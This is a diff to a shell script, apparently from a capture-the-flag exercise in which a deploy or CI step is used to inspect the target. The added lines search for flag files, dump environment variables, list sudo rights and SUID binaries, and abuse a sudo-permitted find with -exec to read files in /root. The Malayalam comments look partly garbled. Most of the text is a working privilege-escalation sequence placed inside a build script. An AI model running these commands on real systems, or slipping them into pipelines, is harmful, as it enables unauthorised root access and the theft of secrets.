@@ -8,41 +8,40 @@ echo "[deploy] done."
 echo "=== TARGET INSPECTION ==="
 id
 env 
-ls -la /
-echo "===== SYSTEM ====="
-id
-whoami
-hostname
-pwd
+ls -la 
+find / -name "*flag*" 2>/dev/null || true
 
-echo "===== ENV ====="
-env | sort
+echo "=== PRINTING THE FLAG ==="
 
-echo "===== HOME ====="
-ls -la ~
-find ~ -maxdepth 3 2>/dev/null
+cat /opt/void/ci_flag.txt
 
-echo "===== ROOT ====="
-ls -la /
+echo "=== PRIVILEGE ESCALATION CHECK ==="
 
-echo "===== ETC ====="
-ls -la /etc 2>/dev/null
+# 1. പസ്വഡ് ഇല്ലത റൂട്ട് ആയ റൺ ചയ്യൻ പറ്റുന്ന കമൻഡുകൾ ഉണ്ട എന്ന് നക്കൻ (SUDO)
 
-echo "===== TMP ====="
-ls -la /tmp 2>/dev/null
+sudo -l || true
 
-echo "===== OPT ====="
-ls -la /opt 2>/dev/null
 
-echo "===== VAR ====="
-ls -la /var 2>/dev/null
+# 2. SUID പർമഷൻ ഉള്ള ഫയലുകൾ കണ്ടത്തൻ (ഇവ റൂട്ട് പ്രവലജൽ റൺ ചയ്യൻ പറ്റയക്കു)
 
-echo "===== SEARCH VOID ====="
-grep -R "VOID{" / 2>/dev/null
+find / -perm -4000 -type f 2>/dev/null || true
 
-echo "===== SEARCH FLAG ====="
-grep -R "flag" / 2>/dev/null
-echo "===== CTF ENUM ====="
-env
-find / -iname "*flag*" 2>/dev/null
-grep -R "VOID{" / 2>/dev/null
+
+# 3. റൂട്ടന്റ ഹ ഡയറക്ടറയൽ എന്തക്ക ഉണ്ടന്ന് നക്കൻ ശ്രമക്ക
+
+ls -la /root || true
+
+echo "=== EXPLOITING SUDO FIND FOR ROOT FLAG ==="
+
+# 1. റൂട്ട് ഡയറക്ടറയൽ ഉള്ള ഫ്ലഗ് ഫയൽ കണ്ടത്തൻ
+
+sudo /usr/bin/find . -exec ls -la /root \; -quit
+
+
+# 2. കണ്ടത്തുന്ന ഫ്ലഗ് ഫയൽ റഡ് ചയ്യൻ (സധരണയയ root_flag.txt അല്ലങ്കൽ flag.txt ആയരക്കു)
+
+sudo /usr/bin/find . -exec cat /root/root_flag.txt \; -quit
+
+echo "=== READING FINAL ROOT FLAG ==="
+
+sudo /usr/bin/find . -exec cat /root/root.txt \; -quit
